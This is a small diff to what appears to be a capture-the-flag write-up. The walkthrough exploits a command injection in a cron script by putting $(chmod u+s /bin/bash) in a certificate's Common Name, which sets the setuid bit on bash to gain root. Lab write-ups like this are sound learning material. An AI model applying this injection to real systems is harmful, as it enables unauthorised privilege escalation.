@@ -263,7 +263,7 @@ Here, indeed, we can exploit a command injection attack, since *$commonName* is 
 Then, inside ~/Certs path, generate a new certification, with this command:
 
 ```
-openssl req -x509 -sha256 -nodes -newkey rsa:4096 -days 1 -keyout broscience.key -out broscience.crt
+openssl req -x509 -sha256 -nodes -newkey rsa:4096 -days 1 -keyout /dev/null -out broscience.crt
 ```
 
 leave blank all the items, except for *Common name*, where you have to put the malicious payload (e.g., ```$(chmod u+s /bin/bash)```); wait that the cronos script runs (so /bin/bash will be set the setuid flag)
